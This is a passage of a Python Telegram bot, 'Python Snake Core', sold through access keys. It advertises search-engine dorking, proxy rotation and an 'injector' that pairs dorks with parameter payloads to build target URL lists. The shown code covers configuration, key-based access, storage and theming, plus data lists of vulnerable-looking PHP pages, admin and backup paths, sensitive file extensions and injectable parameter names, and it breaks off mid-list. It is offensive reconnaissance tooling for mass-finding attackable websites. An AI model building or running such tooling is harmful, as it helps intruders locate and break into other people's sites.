#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🐍 PYTHON SNAKE CORE — v1.0
===========================
Sirf kaam ka bot. Koi faaltu cheez nahi.

TOOLS
-----
  🔍 PARSER      — real search engines se URLs nikaalo (proxy rotate)
  🎯 DORKER      — 67k+ dorks, page-type / extension / parameter / custom
  🔑 HQ KEYWORDS — high quality keyword generator (real scoring)
  🔗 URL REVERSE — URL toda → domain / path / ext / params + dorks
  💉 INJECTOR    — dork × param payload → target URL list
  📦 DUMPER      — sab results file/zip me export
  🧅 PROXY       — 45 sources + DoH bypass + very fast checker
  📊 QUALITY     — dork/keyword ko 0-100 score + wajah
  🎲 RANDOMIZER  — random combos + operator mutation
  👑 ADMIN       — poora control panel

Run:  python3 bot.py   (ya: python3 snake_core.py — dono ek hi file chalate hain)
"""

import os
import re
import sys
import json
import signal
import socket
import platform
import time
import random
import asyncio
import hashlib
import difflib
import logging
import zipfile
import csv
import base64
import html as _html
import string
from datetime import datetime, timedelta
from collections import OrderedDict, defaultdict, deque
from urllib.parse import (urlparse, urlunparse, parse_qs, parse_qsl, urlencode,
                           unquote, quote_plus, urljoin)

try:
    import aiohttp
except ImportError:
    sys.exit("aiohttp missing → pip install aiohttp")

try:
    from telegram import (Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand,
                          Message, CallbackQuery)
    from telegram.constants import ParseMode
    from telegram.ext import (
        Application, ApplicationBuilder, CommandHandler, CallbackQueryHandler,
        MessageHandler, ContextTypes, filters,
    )
except ImportError:
    sys.exit("python-telegram-bot missing → pip install python-telegram-bot")


# ═══════════════════════════════════════════════════════════════════════════════
#  CONFIG  (./setconfig.sh se badlo — repo me placeholder hi rehta hai)
# ═══════════════════════════════════════════════════════════════════════════════
# ⚠️ In do values ko bot.py me mat dhoondho — update ke baad bhi rahengi
#    kyunki ye SNAKE_CONFIG (JSON file) se aati hain, bot.py se nahi.
BOT_TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [8999053405]
ADMIN_USERNAME = "@Bloody_sweet_baby"
BRAND = "PYTHON SNAKE"
VERSION = "v2.11.0"
BUILD = "parser-parallel+inj-fast+rev-vuln"   # feature flags — /ping me dikhte hain
BUILD_TS = "%s"                  # file load hone ka time (deploy check ke liye)
KEY_RE = re.compile(r"^SNK-[A-Z0-9]{4}-[A-Z0-9]{4}$")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_NAME = "snake_config.json"


def _config_paths():
    """Token/admin kahan dhoondhein — pehla jo mile wahi use hoga."""
    home = os.path.expanduser("~")
    return [os.path.join(BASE_DIR, CONFIG_NAME),
            os.path.join("/storage/emulated/0", "DBF", CONFIG_NAME),
            os.path.join(home, "snake", CONFIG_NAME),
            os.path.join(BASE_DIR, "data", CONFIG_NAME)]


def _read_config():
    for pth in _config_paths():
        try:
            if os.path.isfile(pth) and os.path.getsize(pth) < 200000:
                with open(pth, encoding="utf-8", errors="ignore") as f:
                    cfg = json.load(f)
                if isinstance(cfg, dict) and cfg:
                    return cfg, pth
        except Exception:
            continue
    return {}, ""


_CONFIG, CONFIG_PATH = _read_config()


def _cfg_token():
    tok = (os.environ.get("BOT_TOKEN") or _CONFIG.get("bot_token") or
           os.environ.get("SNAKE_BOT_TOKEN") or "").strip()
    return tok


# ── 🎨 MENU EMOJI ────────────────────────────────────────────────────────
#  Ye unicode emoji hamesha dikhte hain (buttons me bhi).
#  Premium (animated) emoji ke IDs config me rakh sakte ho — /se se.
#  Button labels me Telegram custom emoji support NAHI karta — sirf message
#  text me. Isliye buttons hamesha unicode wale dikhate hain.
EMOJI = {
    "kw": "🔑",      # HQ KEYWORDS — same
    "dork": "🧬",    # DORKER
    "parse": "🌐",   # PARSER
    "rev": "🔗",     # URL REVERSE
    "inj": "💉",     # INJECTOR — same
    "dump": "📁",    # DUMPER
    "qa": "📊",      # QUALITY CHECK — same
    "rand": "🎲",
    "help": "📖",
    "proxy": "🧅",
    "home": "🏠",
    "key": "🎟",
    "admin": "🛡",
}

PREMIUM_EMOJI = dict(_CONFIG.get("premium_emoji") or {})   # slot -> custom_emoji_id
EMOJI_OK = [True]          # Telegram reject kare to khud OFF ho jata hai


def emo(slot, fallback=""):
    """Message text ke liye emoji — premium id set ho to ANIMATED ban jata hai.

    <tg-emoji emoji-id="123">🔑</tg-emoji> — Telegram premium users ko
    animation dikhti hai, baaki ko normal emoji.
    """
    base = fallback or EMOJI.get(slot, "")
    cid = str(PREMIUM_EMOJI.get(slot) or "").strip()
    if cid and EMOJI_OK[0] and base:
        return '<tg-emoji emoji-id="%s">%s</tg-emoji>' % (cid, base)
    return base


def emo_btn(slot, fallback=""):
    """Button label ke liye — yahan custom emoji kaam nahi karta."""
    return fallback or EMOJI.get(slot, "")


TG_EMOJI_RX = re.compile(r'<tg-emoji emoji-id="(\d+)">(.*?)</tg-emoji>', re.S)


def strip_premium(text) -> str:
    """Premium tags hata do — normal emoji bacha rehta hai."""
    return TG_EMOJI_RX.sub(lambda m: m.group(2), str(text or ""))


def premium_slots() -> dict:
    """{slot: id} — sirf valid numeric ids."""
    return {k: v for k, v in PREMIUM_EMOJI.items() if str(v).strip().isdigit()}


def set_premium(slot, cid):
    """Admin: ek slot ka premium emoji id set/remove karo (config me save)."""
    slot = str(slot or "").strip().lower()
    cid = str(cid or "").strip()
    if slot not in EMOJI:
        return False, "unknown slot: <code>%s</code>" % esc(slot)
    if cid.lower() in ("0", "off", "no", "none", "remove", "-"):
        PREMIUM_EMOJI.pop(slot, None)
    else:
        if not cid.isdigit() or len(cid) < 6:
            return False, "emoji-id numeric honi chahiye (jaise <code>5368324170671202286</code>)"
        PREMIUM_EMOJI[slot] = cid
    try:
        _save_config()
    except Exception as exc:
        return False, "save fail: %s" % exc
    EMOJI_OK[0] = True       # naya id — dobara try karo
    return True, ""


def _cfg_admins(base):
    raw = _CONFIG.get("admin_ids")
    if raw is None:
        raw = os.environ.get("ADMIN_IDS", "")
        raw = [x for x in re.split(r"[,\s]+", str(raw)) if x.strip().isdigit()]
    out = []
    for x in (raw if isinstance(raw, (list, tuple)) else [raw]):
        try:
            v = int(str(x).strip())
        except Exception:
            continue
        if v > 0 and v not in out:
            out.append(v)
    return out or list(base)


def _save_config(*, token=None, admin_ids=None):
    """Config ko disk pe likho. Token kabhi log/chat me print nahi hota."""
    cfg = dict(_CONFIG)
    if token is not None:
        cfg["bot_token"] = str(token).strip()
    if admin_ids is not None:
        cfg["admin_ids"] = [int(x) for x in admin_ids]
    cfg.setdefault("brand", BRAND)
    if PREMIUM_EMOJI:
        cfg["premium_emoji"] = dict(PREMIUM_EMOJI)
    cfg["updated"] = time.strftime("%Y-%m-%d %H:%M:%S")
    targets = [os.path.join(BASE_DIR, CONFIG_NAME)]
    ext = os.path.join("/storage/emulated/0", "DBF")
    if os.path.isdir(ext) and os.path.abspath(ext) != os.path.abspath(BASE_DIR):
        targets.append(os.path.join(ext, CONFIG_NAME))
    written = []
    for pth in targets:
        try:
            tmp = pth + ".tmp"
            os.makedirs(os.path.dirname(pth), exist_ok=True)
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(cfg, f, indent=2)
            try:
                os.chmod(tmp, 0o600)
            except Exception:
                pass
            os.replace(tmp, pth)
            written.append(pth)
        except Exception as exc:
            logger.warning("config save fail %s: %s", pth, exc)
    globals().update({"_CONFIG": cfg})
    return written


# config se override (env > file > hardcoded fallback)
_tok_file = _cfg_token()
if _tok_file:
    BOT_TOKEN = _tok_file
ADMIN_IDS = _cfg_admins(ADMIN_IDS)
DATA_DIR = os.path.join(BASE_DIR, "data")
DUMP_DIR = os.path.join(BASE_DIR, "dumps")
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(DUMP_DIR, exist_ok=True)


def _token_ok(tok) -> bool:
    tok = str(tok or "").strip()
    return bool(tok) and "PUT_YOUR" not in tok and ":" in tok and len(tok) >= 20


def _recover_from_backups():
    """Token kisi purane update me ud gaya? backups/DBF se wapas nikaal lo."""
    import glob
    cands = []
    for pat in (os.path.join(BASE_DIR, "backups", "bot_*.py"),
                os.path.join(BASE_DIR, "bot*.py"),
                "/storage/emulated/0/DBF/bot*.py",
                os.path.join(os.path.expanduser("~"), "snake", "bot*.py")):
        try:
            cands.extend(sorted(glob.glob(pat), reverse=True)[:6])
        except Exception:
            continue
    seen = set()
    for pth in cands:
        rp = os.path.abspath(pth)
        if rp in seen or rp == os.path.abspath(__file__):
            continue
        seen.add(rp)
        try:
            if os.path.getsize(pth) > 5 * 1024 * 1024:
                continue
            src = open(pth, encoding="utf-8", errors="ignore").read()
        except Exception:
            continue
        m = re.search(r"^BOT_TOKEN\s*=\s*[\"']([^\"']*)[\"']", src, re.M)
        tok = (m.group(1) if m else "").strip()
        if _token_ok(tok):
            am = re.search(r"^ADMIN_IDS\s*=\s*\[([^\]]*)\]", src, re.M)
            adm = [int(x) for x in re.findall(r"\d{5,}", am.group(1))] if am else []
            logger.info("♻️ token/admin backup se recover — %s", os.path.basename(pth))
            return tok, adm
    return "", []


def _migrate_config():
    """Purani install (token bot.py ke andar) → ek baar config file bana do.

    Isse pehli update ke baad bhi token/admin safe rahenge.
    """
    try:
        if CONFIG_PATH and os.path.isfile(CONFIG_PATH):
            return
        if os.environ.get("SNAKE_NO_MIGRATE") == "1":
            return                      # tests me kabhi file na likhe
        if __name__ not in ("__main__", "snake_core"):
            return                      # sirf real start (shim included) pe
        tok = str(BOT_TOKEN or "").strip()
        good = _token_ok(tok)
        if not good:
            tok, adm = _recover_from_backups()      # backup me ho to wapas
            good = _token_ok(tok)
            if good:
                globals()["BOT_TOKEN"] = tok
                if adm:
                    globals()["ADMIN_IDS"] = adm
                logger.info("♻️ admins recovered: %s", adm)
        if not good:
            return                      # placeholder token se config na banao
        pth = os.path.join(BASE_DIR, CONFIG_NAME)
        cfg = {"bot_token": tok if good else "",
               "admin_ids": [int(x) for x in ADMIN_IDS],
               "brand": BRAND,
               "created": time.strftime("%Y-%m-%d %H:%M:%S"),
               "note": "Token/Admin yahan safe hain — ./update.sh inse touch nahi karta"}
        with open(pth, "w", encoding="utf-8") as f:
            json.dump(cfg, f, indent=2)
        try:
            os.chmod(pth, 0o600)
        except Exception:
            pass
        globals().update({"_CONFIG": cfg, "CONFIG_PATH": pth})
        logger.info("🔐 config saved → %s (token/admin update-safe)", pth)
    except Exception as exc:
        logger.warning("config migrate skip: %s", exc)


logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logger = logging.getLogger("snake")

START_TS = time.time()
BUILD_TS = time.strftime("%d-%m %H:%M", time.localtime())

_migrate_config()          # token/admin ek baar bahar nikaal do (update-safe)

TOKEN = BOT_TOKEN
if (not TOKEN) or ("PUT_YOUR_BOT_TOKEN_HERE" in str(TOKEN)) or (":" not in str(TOKEN)):
    if __name__ == "__main__":
        print("\n" + "=" * 62)
        print("  ❌ BOT TOKEN IS NOT SET")
        print("=" * 62)
        print("  Paste the token (from BotFather):\n")
        print("      ./setconfig.sh\n")
        print("  or directly:\n")
        print("      ./settoken.sh 123456789:AAxxxxxxxxxxxxxxxxxxxxxxx\n")
        print("  Then:  ./restart.sh")
        print("=" * 62 + "\n")
        raise SystemExit(2)


# ═══════════════════════════════════════════════════════════════════════════════
#  STORAGE — chhoti JSON files, atomic write
# ═══════════════════════════════════════════════════════════════════════════════
_LOCK = asyncio.Lock()


def _path(name: str) -> str:
    return os.path.join(DATA_DIR, name + ".json")


def jload(name: str, default=None):
    try:
        with open(_path(name), encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default if default is not None else {}


def jsave(name: str, obj) -> bool:
    try:
        tmp = _path(name) + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(obj, f, ensure_ascii=False, indent=1)
        os.replace(tmp, _path(name))
        return True
    except Exception as exc:
        logger.warning("save %s fail: %s", name, exc)
        return False


# ── FRESH system — pehle bane dorks yaad rakho (repeat na ho) ────────────────
SEEN_FILE = os.path.join(DATA_DIR, "dork_seen.txt")
_SEEN = None
_SEEN_LIMIT = 400000


def dork_hash(x) -> str:
    return hashlib.sha1(" ".join(str(x or "").lower().split()).encode("utf-8", "ignore")).hexdigest()[:12]


def dork_seen() -> set:
    """Pehle generate hue dorks ke hashes (memory cache)."""
    global _SEEN
    if _SEEN is None:
        try:
            with open(SEEN_FILE, encoding="utf-8", errors="ignore") as f:
                _SEEN = {ln.strip() for ln in f if ln.strip()}
        except Exception:
            _SEEN = set()
    return _SEEN


def dork_seen_count() -> int:
    return len(dork_seen())


def dork_seen_add(dorks) -> int:
    """Naye dorks history me daalo. Returns kitne naye the."""
    seen = dork_seen()
    new = []
    for d in dorks or []:
        h = dork_hash(d)
        if h and h not in seen:
            seen.add(h)
            new.append(h)
    if not new:
        return 0
    try:
        with open(SEEN_FILE, "a", encoding="utf-8") as f:
            f.write("\n".join(new) + "\n")
    except Exception:
        return 0
    if len(seen) > _SEEN_LIMIT:
        dork_seen_trim()
    return len(new)


def dork_seen_trim(keep: int = None) -> int:
    """File bahut badi ho gayi to purane half hata do."""
    global _SEEN
    keep = int(keep or (_SEEN_LIMIT // 2))
    try:
        with open(SEEN_FILE, encoding="utf-8", errors="ignore") as f:
            lines = [ln.strip() for ln in f if ln.strip()]
    except Exception:
        return 0
    if len(lines) <= keep:
        return 0
    lines = lines[-keep:]
    try:
        with open(SEEN_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except Exception:
        return 0
    _SEEN = set(lines)
    return len(lines)


def dork_seen_clear() -> int:
    global _SEEN
    n = len(dork_seen())
    try:
        open(SEEN_FILE, "w").close()
    except Exception:
        pass
    _SEEN = set()
    return n


USERS = jload("users", {})          # uid -> {name, joined, banned, runs}
KEYS = jload("keys", {})            # key -> {days, used_by, used_at, created}
SETTINGS = jload("settings", {})    # admin-tunable runtime settings


def save_all() -> None:
    jsave("users", USERS)
    jsave("keys", KEYS)
    jsave("settings", SETTINGS)


def sget(key: str, default=None):
    return SETTINGS.get(key, default)


def sset(key: str, value) -> None:
    SETTINGS[key] = value
    jsave("settings", SETTINGS)


AWAIT_TTL = 900          # 15 min — iske baad adhoora input expire ho jata hai


def await_set(ctx, key: str):
    """User se agla input is handler se lena hai (timestamp ke saath)."""
    try:
        ctx.user_data["await"] = key
        ctx.user_data["await_ts"] = time.time()
    except Exception:
        pass


def await_get(ctx):
    """Pending input — TTL ke baad khaali (stale flow bug fix)."""
    try:
        k = ctx.user_data.get("await")
        if not k:
            return None
        ts = float(ctx.user_data.get("await_ts") or 0)
        if ts and (time.time() - ts) > AWAIT_TTL:
            await_clear(ctx)
            return None
        return k
    except Exception:
        return None


def await_clear(ctx):
    """Pending input hatao (naya screen = naya intent)."""
    try:
        ctx.user_data.pop("await", None)
        ctx.user_data.pop("await_ts", None)
        ctx.user_data.pop("await_admin", None)
    except Exception:
        pass


def _put_pending(context, wait: str, items: list) -> None:
    """Count wale step pe file aayi → yaad rakho, count ke baad use karenge."""
    try:
        context.user_data["pending_file"] = {"wait": wait, "items": list(items or [])[:FILE_MAX_LINES],
                                             "ts": time.time()}
    except Exception:
        pass


def _take_pending(context, *waits) -> list:
    """Pending file (agar isi flow ki hai aur 15 min ke andar) → items."""
    try:
        p = context.user_data.pop("pending_file", None)
    except Exception:
        return []
    if not isinstance(p, dict):
        return []
    if waits and p.get("wait") not in waits:
        return []
    if time.time() - float(p.get("ts") or 0) > AWAIT_TTL:
        return []
    return list(p.get("items") or [])


def is_admin(uid) -> bool:
    try:
        return int(uid) in [int(x) for x in ADMIN_IDS]
    except Exception:
        return False


def has_access(uid) -> bool:
    uid = str(uid)
    if is_admin(uid):
        return True
    u = USERS.get(uid) or {}
    if u.get("banned"):
        return False
    exp = u.get("expires")
    if not exp:
        return False
    try:
        return datetime.fromisoformat(exp) > datetime.now()
    except Exception:
        return False


def touch_user(update) -> dict:
    u = update.effective_user
    uid = str(u.id)
    rec = USERS.get(uid) or {}
    if not rec:
        rec = {"joined": datetime.now().isoformat(timespec="seconds"), "runs": 0}
    rec["name"] = (u.username and ("@" + u.username)) or u.first_name or "?"
    rec["last"] = datetime.now().isoformat(timespec="seconds")
    USERS[uid] = rec
    jsave("users", USERS)
    return rec


# ═══════════════════════════════════════════════════════════════════════════════
#  SMALL UTILS
# ═══════════════════════════════════════════════════════════════════════════════
def fmt(n) -> str:
    try:
        return format(int(n), ",")
    except Exception:
        return str(n)


def bar(pct: float, width: int = 12) -> str:
    """Stylish progress bar: ▰▰▰▰▱▱▱▱"""
    pct = max(0.0, min(100.0, float(pct)))
    filled = int(round(pct / 100 * width))
    if filled >= width:
        return "▰" * width
    if filled <= 0:
        return "▱" * width
    return "▰" * filled + "▱" * (width - filled)


def bar_pct(pct: float, width: int = 14) -> str:
    """Bar + percentage ek line me."""
    pct = max(0.0, min(100.0, float(pct)))
    return "%s  <b>%d%%</b>" % (bar(pct, width), int(round(pct)))


INJ_SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
DUMP_SPIN = "◐◓◑◒"


def bar2(pct: float, width: int = 14, spin: int = 0) -> str:
    """INJECTOR ka apna bar — ⟦▓▓▓░░░░⟧ + spinner (parser wale se alag).

    spin=None → ✔ (kaam khatam).
    """
    pct = max(0.0, min(100.0, float(pct)))
    filled = int(round(pct / 100.0 * width))
    sp = "✔" if spin is None else INJ_SPIN[int(spin) % len(INJ_SPIN)]
    return "%s ⟦%s%s⟧ <b>%d%%</b>" % (sp, "▓" * filled, "░" * (width - filled),
                                      int(round(pct)))


def bar3(pct: float, width: int = 12, spin: int = 0) -> str:
    """DUMPER ka apna bar — ◐ [██████──────] 57%. spin=None → ✔."""
    pct = max(0.0, min(100.0, float(pct)))
    filled = int(round(pct / 100.0 * width))
    sp = "✔" if spin is None else DUMP_SPIN[int(spin) % len(DUMP_SPIN)]
    return "%s [%s%s]  <b>%d%%</b>" % (sp, "█" * filled, "─" * (width - filled),
                                       int(round(pct)))


def short_list(items, n=12) -> str:
    items = list(items)
    out = items[:n]
    return "\n".join("• <code>%s</code>" % _html.escape(str(x)) for x in out) or "—"


def stamp() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


def esc(x) -> str:
    return _html.escape(str(x), quote=False)


def chunk_lines(text: str, limit: int = 3900):
    """Bade text ko Telegram-safe chunks me todo."""
    out, cur = [], []
    size = 0
    for line in text.split("\n"):
        if size + len(line) + 1 > limit and cur:
            out.append("\n".join(cur))
            cur, size = [], 0
        cur.append(line)
        size += len(line) + 1
    if cur:
        out.append("\n".join(cur))
    return out


# (H() theme engine me define hota hai — neeche)


# ═══════════════════════════════════════════════════════════════════════════════
#  🎨 THEME ENGINE — unicode fonts, dividers, icons
# ═══════════════════════════════════════════════════════════════════════════════
import unicodedata as _ud


def _font_map(caps=None, low=None, digs=None, exc=None) -> dict:
    """Unicode math range -> dict. Hole (unassigned) codepoint = original char."""
    d = {}
    if caps:
        for i, ch in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
            d[ch] = chr(ord(caps) + i)
    if low:
        for i, ch in enumerate("abcdefghijklmnopqrstuvwxyz"):
            d[ch] = chr(ord(low) + i)
    if digs:
        for i in range(10):
            d[str(i)] = chr(ord(digs) + i)
    if exc:
        d.update(exc)
    for k, v in list(d.items()):
        try:
            if _ud.category(v) in ("Cn", "Cs", "Co"):
                d[k] = k
        except Exception:
            d[k] = k
    return d


_SMALL = dict(zip(
    "abcdefghijklmnopqrstuvwxyz",
    "ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ"))
_SMALL.update({k.upper(): v for k, v in list(_SMALL.items()) if k.isalpha() and v != k})
_SMALL["X"] = "x"   # small-cap X exist nahi karta — consistency ke liye lowercase

_CIRCLE = {}
for _i, _ch in enumerate("abcdefghijklmnopqrstuvwxyz"):
    _CIRCLE[_ch] = chr(0x24D0 + _i)
    _CIRCLE[_ch.upper()] = chr(0x24B6 + _i)
for _i in range(10):
    _CIRCLE[str(_i)] = chr(0x2460 + _i)

FONTS = {
    "plain":       {},
    "bold":        _font_map("\U0001D400", "\U0001D41A", "\U0001D7CE"),
    "italic":      _font_map("\U0001D434", "\U0001D44E", None, {"h": "\u210E"}),
    "bi":          _font_map("\U0001D468", "\U0001D482"),
    "script":      _font_map("\U0001D49C", "\U0001D4B6", None, {
                       "B": "\u212C", "E": "\u2130", "F": "\u2131", "H": "\u210B",
                       "I": "\u2110", "L": "\u2112", "M": "\u2133", "R": "\u211B",
                       "e": "\u212F", "g": "\u210A", "o": "\u2134"}),
    "bold_script": _font_map("\U0001D4D0", "\U0001D4EA"),
    "fraktur":     _font_map("\U0001D504", "\U0001D51E", None, {
                       "C": "\u212D", "H": "\u210C", "I": "\u2111",
                       "R": "\u211C", "Z": "\u2128"}),
    "double":      _font_map("\U0001D538", "\U0001D552", "\U0001D7D8", {
                       "C": "\u2102", "H": "\u210D", "N": "\u2115", "P": "\u2119",
                       "Q": "\u211A", "R": "\u211D", "Z": "\u2124"}),
    "sans":        _font_map("\U0001D5A0", "\U0001D5BA", "\U0001D7E2"),
    "sans_bold":   _font_map("\U0001D5D4", "\U0001D5EE", "\U0001D7EC"),
    "sans_italic": _font_map("\U0001D608", "\U0001D622"),
    "sans_bi":     _font_map("\U0001D63C", "\U0001D656"),
    "mono":        _font_map("\U0001D670", "\U0001D68A", "\U0001D7F6"),
    "wide":        _font_map("\uFF21", "\uFF41", "\uFF10"),
    "small":       _SMALL,
    "circle":      _CIRCLE,
}


def F(text, font: str = "plain") -> str:
    """Text ko diye font me badlo. Unknown chars waise hi rehte hain."""
    m = FONTS.get(font)
    if not m:
        return str(text)
    return "".join(m.get(c, c) for c in str(text))


# ── THEMES ───────────────────────────────────────────────────────────────────
# head = heading font • btn = button font • sub = subtitle font
# div = divider • icon = logo icon • tag = chhota accent
THEMES = OrderedDict([
    ("classic", {
        "label": "✿︎ CLASSIC", "head": "small", "btn": "small", "sub": "italic",
        "div": "✿︎━━━━━━━━━━━━━━━━━━━━━✿︎",
        "icon": "🐍", "tag": "✿︎",
    }),
    ("cursive", {
        "label": "❤︎ CURSIVE", "head": "bold_script", "btn": "script", "sub": "italic",
        "div": "❤︎﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌❤︎",
        "icon": "🌸", "tag": "❤︎",
    }),
    ("poppins", {
        "label": "﹌ POPPINS", "head": "sans_bold", "btn": "sans_bold", "sub": "sans_italic",
        "div": "﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌",
        "icon": "🐍", "tag": "﹌",
    }),
    ("italic", {
        "label": "಄ ITALIC", "head": "bi", "btn": "bi", "sub": "italic",
        "div": "಄───────────────────಄",
        "icon": "✦", "tag": "಄",
    }),
    ("royal", {
        "label": "♛ ROYAL", "head": "fraktur", "btn": "double", "sub": "italic",
        "div": "♛﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌﹌♛",
        "icon": "♛", "tag": "✦",
    }),
    ("roboto", {
        "label": "◆ ROBOTO", "head": "sans", "btn": "sans", "sub": "sans_italic",
        "div": "◆▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬◆",
        "icon": "◆", "tag": "▸",
    }),
    ("bold", {
        "label": "𝗕 BOLD", "head": "bold", "btn": "bold", "sub": "italic",
        "div": "❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❰❱",
        "icon": "🔥", "tag": "❰",
    }),
    ("mono", {
        "label": "▚ MONO", "head": "mono", "btn": "mono", "sub": "mono",
        "div": "▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚▚",
        "icon": "▚", "tag": "▚",
    }),
])
DEFAULT_THEME = "classic"

_EMOJI_HEAD = re.compile(r"^([\U0001F000-\U0001FAFF\u2190-\u2BFF\u2600-\u27BF"
                         r"\uFF00-\uFFEF\u3000-\u303F\u0E00-\u0E7F\u0C80-\u0CFF"
                         r"\u0900-\u097F\s]+)")


def theme_name() -> str:
    """Abhi kaun sa theme chalu hai."""
    t = str(sget("theme") or DEFAULT_THEME)
    return t if t in THEMES else DEFAULT_THEME


def T() -> dict:
    return THEMES[theme_name()]


def style(text: str, role: str = "btn") -> str:
    """Emoji/icon ko chhod ke sirf text ko theme font me badlo."""
    s2 = str(text or "")
    if not s2:
        return s2
    m = _EMOJI_HEAD.match(s2)
    pre = m.group(1) if m else ""
    rest = s2[len(pre):]
    if not rest:
        return s2
    font = T().get(role) or "plain"
    return pre + F(rest, font)


def H(title: str, sub: str = "", slot: str = "") -> str:
    """Theme header — divider + icon + heading font.

    slot diya to us tool ka emoji lagta hai (premium ho to animated).
    """
    th = T()
    d = th["div"]
    icon = emo(slot) if slot else th["icon"]
    body = "%s %s" % (icon, F(title, th["head"]))
    if sub:
        body += "\n%s" % F(sub, th["sub"])
    return "%s\n%s\n%s" % (d, body, d)


def tag(text: str = "") -> str:
    """Chhota accent — body me headings ke liye."""
    th = T()
    t = F(text, th["head"]) if text else ""
    return ("%s %s %s" % (th["tag"], t, th["tag"])).strip()


def RK(rows, **kw):
    """InlineKeyboardMarkup + har button label pe theme font."""
    out = []
    for row in (rows or []):
        nr = []
        for b in row:
            try:
                label = style(b.text, "btn")
                data = getattr(b, "callback_data", None)
                url = getattr(b, "url", None)
                if data:
                    nr.append(InlineKeyboardButton(label[:64], callback_data=data))
                elif url:
                    nr.append(InlineKeyboardButton(label[:64], url=url))
                else:
                    nr.append(b)
            except Exception:
                nr.append(b)
        if nr:
            out.append(nr)
    return InlineKeyboardMarkup(out, **kw)


# ═══════════════════════════════════════════════════════════════════════════════
#  DATA — dorking ke buniyadi tukde
# ═══════════════════════════════════════════════════════════════════════════════
PAGE_FILES = [
    "product.php", "product_detail.php", "product-detail.php", "productdetails.php",
    "item.php", "item_detail.php", "itemdetail.php", "item-details.php",
    "details.php", "detail.php", "product.php?id=", "item.php?id=",
    "shop.php", "store.php", "cart.php", "checkout.php", "order.php", "orders.php",
    "category.php", "categories.php", "listing.php", "catalog.php", "catalogue.php",
    "view.php", "viewitem.php", "show.php", "display.php", "read.php", "post.php",
    "article.php", "news.php", "blog.php", "page.php", "index.php", "main.php",
    "content.php", "download.php", "file.php", "get.php", "fetch.php", "api.php",
    "search.php", "results.php", "query.php", "login.php", "signin.php", "register.php",
    "signup.php", "profile.php", "user.php", "users.php", "account.php", "admin.php",
    "dashboard.php", "panel.php", "config.php", "settings.php", "upload.php", "image.php",
    "gallery.php", "photo.php", "video.php", "play.php", "stream.php", "redirect.php",
    "link.php", "goto.php", "out.php", "track.php", "invoice.php", "receipt.php",
    "report.php", "export.php", "print.php", "pdf.php", "xml.php", "json.php",
]

PAGE_DIRS = [
    "", "shop/", "store/", "products/", "product/", "item/", "items/", "catalog/",
    "category/", "categories/", "admin/", "administrator/", "panel/", "cp/", "dashboard/",
    "user/", "users/", "member/", "members/", "account/", "accounts/", "profile/",
    "api/", "api/v1/", "api/v2/", "v1/", "v2/", "v3/", "web/", "app/", "public/",
    "includes/", "include/", "inc/", "lib/", "src/", "core/", "system/", "modules/",
    "components/", "pages/", "page/", "content/", "data/", "files/", "upload/",
    "uploads/", "media/", "images/", "img/", "assets/", "static/", "tmp/", "temp/",
    "backup/", "backups/", "old/", "new/", "test/", "dev/", "staging/", "prod/",
]

EXTENSIONS = [
    "php", "php3", "php4", "php5", "phtml", "phps", "asp", "aspx", "ashx", "asmx",
    "jsp", "jspx", "do", "action", "cfm", "cfml", "cgi", "pl", "py", "rb", "go",
    "html", "htm", "xhtml", "shtml", "xml", "json", "js", "css", "txt", "log",
    "sql", "db", "sqlite", "mdb", "bak", "backup", "old", "orig", "save", "swp",
    "zip", "rar", "7z", "tar", "gz", "bz2", "env", "ini", "conf", "cfg", "yml",
    "yaml", "toml", "lock", "pdf", "doc", "docx", "xls", "xlsx", "csv", "odt",
]

PARAMS_BASE = [
    "id", "pid", "cid", "uid", "sid", "tid", "nid", "aid", "bid", "gid", "did", "fid",
    "cat", "catid", "cat_id", "category", "category_id", "item", "itemid", "item_id",
    "product", "productid", "product_id", "prod", "prodid", "sku", "code", "ref",
    "page", "pageid", "page_id", "p", "pg", "view", "viewid", "num", "no", "n",
    "user", "username", "userid", "user_id", "login", "email", "mail", "name",
    "order", "orderid", "order_id", "invoice", "invoiceid", "receipt", "txn", "transaction",
    "doc", "docid", "document", "file", "filename", "file_id", "path", "dir", "folder",
    "url", "link", "redirect", "return", "next", "goto", "target", "dest", "destination",
    "search", "q", "query", "s", "keyword", "keywords", "term", "terms", "find",
    "type", "sort", "order_by", "orderby", "filter", "lang", "language", "locale",
    "action", "do", "task", "op", "cmd", "command", "mode", "method", "func", "function",
    "module", "mod", "page_name", "section", "sec", "tab", "step", "stage", "state",
    "download", "dl", "get", "fetch", "load", "read", "readfile", "open", "include",
    "template", "tpl", "theme", "skin", "layout", "style", "css", "js",
    "admin", "panel", "config", "setting", "settings", "option", "options",
    "token", "key", "apikey", "api_key", "secret", "auth", "session", "sess",
    "date", "from", "to", "start", "end", "year", "month", "day", "limit", "offset",
    "count", "size", "len", "width", "height", "format", "output", "result", "status",
]

TLDS = [
    "com", "net", "org", "in", "co.uk", "io", "co", "de", "fr", "it", "es", "nl",
    "ru", "br", "mx", "ar", "pl", "se", "no", "dk", "fi", "ch", "at", "be", "pt",
